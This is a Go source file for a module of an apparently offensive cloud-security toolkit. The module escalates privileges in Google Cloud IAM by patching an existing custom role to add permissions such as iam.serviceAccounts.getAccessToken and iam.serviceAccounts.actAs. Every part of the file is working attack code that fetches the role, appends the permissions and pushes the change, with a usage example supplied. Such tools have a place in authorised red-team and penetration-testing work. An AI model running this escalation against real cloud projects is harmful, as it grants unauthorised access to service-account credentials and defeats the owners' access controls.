package iam

import (
	"context"
	"fmt"

	iamv1 "google.golang.org/api/iam/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateCustomRole{})
}

// EscalateCustomRole updates an existing custom role to add dangerous permissions.
type EscalateCustomRole struct{}

func (m *EscalateCustomRole) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-custom-role",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Update a custom IAM role to add dangerous permissions",
		RequiresAuth: true,
	}
}

func (m *EscalateCustomRole) Run(ctx module.RunContext) error {
	roleName := ctx.Flags["role"]
	addPerms := ctx.Flags["add-permissions"]

	if roleName == "" || addPerms == "" {
		output.Warn("Usage: run privesc.iam.escalate-custom-role --role <projects/PROJECT/roles/ROLE> --add-permissions <perm1,perm2,...>")
		output.Info("Example: --role projects/my-project/roles/customDev --add-permissions iam.serviceAccounts.getAccessToken,iam.serviceAccounts.actAs")
		return nil
	}

	permissions := splitAndTrim(addPerms)
	if len(permissions) == 0 {
		output.Warn("No valid permissions provided.")
		return nil
	}

	svc, err := iamv1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create IAM client: %w", err)
	}

	output.Info("Fetching existing role: %s", roleName)

	existingRole, err := svc.Projects.Roles.Get(roleName).Do()
	if err != nil {
		return fmt.Errorf("get role: %w", err)
	}

	output.Info("Current permissions (%d): %v", len(existingRole.IncludedPermissions), existingRole.IncludedPermissions)

	// Build a set of existing permissions to avoid duplicates.
	permSet := make(map[string]bool)
	for _, p := range existingRole.IncludedPermissions {
		permSet[p] = true
	}

	added := 0
	for _, p := range permissions {
		if !permSet[p] {
			existingRole.IncludedPermissions = append(existingRole.IncludedPermissions, p)
			permSet[p] = true
			added++
			output.Info("  Adding: %s", p)
		} else {
			output.Info("  Already present: %s", p)
		}
	}

	if added == 0 {
		output.Info("All requested permissions already present. No changes needed.")
		return nil
	}

	output.Warn("Patching role with %d new permissions", added)

	patchedRole, err := svc.Projects.Roles.Patch(roleName, existingRole).UpdateMask("includedPermissions").Do()
	if err != nil {
		return fmt.Errorf("patch role: %w", err)
	}

	output.Success("Role updated: %s (%d total permissions)", patchedRole.Name, len(patchedRole.IncludedPermissions))

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-custom-role",
			Severity:    module.SevCritical,
			Title:       "Custom IAM role escalated with dangerous permissions",
			Description: fmt.Sprintf("Added %d permissions to role %s: %v", added, roleName, permissions),
			Resource:    roleName,
		}
	}

	return nil
}
